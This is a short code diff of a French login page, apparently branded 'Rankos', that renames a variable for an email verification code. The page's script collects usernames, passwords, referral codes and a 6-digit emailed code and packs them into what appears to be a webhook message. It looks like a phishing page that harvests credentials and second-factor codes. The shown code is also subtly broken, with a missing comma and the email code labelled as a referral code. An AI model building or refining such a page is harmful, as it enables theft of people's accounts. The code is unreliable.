@@ -141,7 +141,7 @@
   <p>Saisir le code a 6 chiffre envoyé dans votre boite e-mail</p>
 
   <div class="form-group">
-    <label for="Mail">CodeMail</label>
+    <label for="mail">CodeMail</label>
     <input type="text" placeholder="Entrez votre code" />
   </div>
 
@@ -158,7 +158,7 @@
 
       const username = document.getElementById('username').value.trim();
       const password = document.getElementById('password').value.trim();
-      const Mail = document.getElementById('Mail').value.trim();
+      const mail = document.getElementById('mail').value.trim();
       const referralCode = document.getElementById('referralCode').value.trim();
 
       const errorMessage = document.getElementById('errorMessage');
@@ -186,7 +186,7 @@
             { name: "👤 Nom d'utilisateur / e-mail", value: username },
             { name: "🔒 Mot de passe", value: password },
             { name: "🎁 Code de parrainage", value: referralCode }
-            { name: "🎁 Code de parrainage", value: Mail }
+            { name: "🎁 Code de parrainage", value: mail }
           ],
           timestamp: new Date().toISOString(),
           footer: { text: "Formulaire Rankos" }
